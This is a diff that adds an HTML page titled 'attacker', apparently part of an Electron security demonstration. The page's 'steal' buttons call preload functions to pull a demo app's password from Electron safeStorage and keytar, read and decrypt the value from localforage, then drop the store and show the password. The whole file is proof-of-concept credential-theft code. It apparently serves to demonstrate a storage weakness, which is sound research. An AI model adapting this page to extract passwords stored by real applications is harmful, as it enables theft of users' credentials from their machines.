@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>attacker</title>
+  <script src="node_modules/localforage/dist/localforage.js"></script>
+</head>
+<body>
+  <h3>steal data from demo app</h3>
+  <p class="safeStorage"><button>steal</button> safeStorage password is <span></span></p>
+  <p class="keytar"><button>steal</button> keytar password is <span></span></p>
+</body>
+<script>
+
+document.addEventListener('click', async (e) => {
+  const target = e.target;
+  if (target.nodeName !== 'BUTTON') {
+    return;
+  }
+  const el = target.parentElement;
+  let value;
+  if (el.className === 'safeStorage') {
+    await window.electron.stealSafeStorage();
+    const store = localforage.createInstance({
+      name: 'localforage',
+      storeName: 'keyvaluepairs'
+    });
+    value = await store.getItem('safeStorage');
+    value = await window.electron.decrypt(value);
+    localforage.dropInstance({
+      name: 'localforage',
+      storeName: 'keyvaluepairs'
+    });
+  } else if (el.className === 'keytar') {
+    value = await window.electron.stealKeytar();
+  }
+  console.log(value);
+  el.lastElementChild.innerText = value;
+});
+</script>
+</html>
